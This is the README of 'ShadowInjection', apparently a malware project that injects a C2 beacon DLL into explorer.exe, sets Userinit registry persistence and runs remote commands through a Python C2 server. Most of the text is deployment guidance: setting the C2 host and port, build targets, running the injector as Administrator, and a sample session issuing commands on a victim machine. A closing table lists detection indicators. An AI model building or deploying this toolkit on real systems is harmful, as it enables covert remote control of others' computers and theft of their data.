# ShadowInjection

C2 beacon with DLL injection into explorer.exe.

## Features

* HTTP C2 communication
* DLL injection into explorer.exe
* Userinit persistence
* Remote command execution

## Components

| Component      | Description                              |
| -------------- | ---------------------------------------- |
| `beacon.dll`   | C2 beacon that executes commands         |
| `loader.exe`   | Injects `beacon.dll` into `explorer.exe` |
| `injector.exe` | Deploys files and sets up persistence    |
| `c2.py`        | Python C2 server for command and control |

## Configuration

Edit `src/common.h`:

```cpp
#define C2_SERVER L"your-server.com"  // C2 server
#define C2_PORT 80                    // C2 port
#define BEACON_INTERVAL 10            // Beacon interval (seconds)
```

## C2 Server

### Setup

```bash
# Install Python 3 if not installed

# Run C2 server
python c2.py
```

### Usage

```bash
# Start server
python c2.py

# Commands
c2> whoami           # Execute command on target
c2> ipconfig         # Get network info
c2> dir C:\          # List directory
c2> exit             # Stop C2 server
```

### C2 Server Features

* `GET /` — Beacon retrieves commands
* `POST /result` — Beacon sends command output
* Console interface for sending commands
* Supports CP866 and UTF-8 encoding

## Build

```bash
make all         # Build all components
make beacon_dll  # Build only beacon.dll
make injector    # Build only injector.exe
make clean       # Clean build directory
make run         # Build and run injector (Admin required)
```

## Usage

### Step 1: Start C2 Server

```bash
python c2.py
```

### Step 2: Run Injector

```bash
# Run as Administrator
cd build
injector.exe
```

### Step 3: Send Commands

```bash
c2> whoami
[*] Sent: whoami
[+] Result:
----------------------------------------
desktop-xxx\user
----------------------------------------
```

## Architecture

```text
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  injector   │────▶│   loader    │────▶│  explorer   │
│    .exe     │     │    .exe     │     │    .exe     │
└─────────────┘     └─────────────┘     └──────┬──────┘
                                                │
                                           ┌────▼────┐
                                           │ beacon  │
                                           │  .dll   │
                                           └────┬────┘
                                                │
                                           ┌────▼────┐
                                           │   GET   │
                                           │   POST  │
                                           └────┬────┘
                                                │
                                           ┌────▼────┐
                                           │  c2.py  │
                                           │ Server  │
                                           └─────────┘
```

## Detection Indicators

| Type     | Indicators                              |
| -------- | --------------------------------------- |
| Files    | `C:\Windows\Temp\ShadowInject\`         |
| Registry | `HKLM\...\Winlogon\Userinit` modified   |
| Process  | `explorer.exe` with loaded `beacon.dll` |
| Network  | Regular HTTP GET/POST requests          |
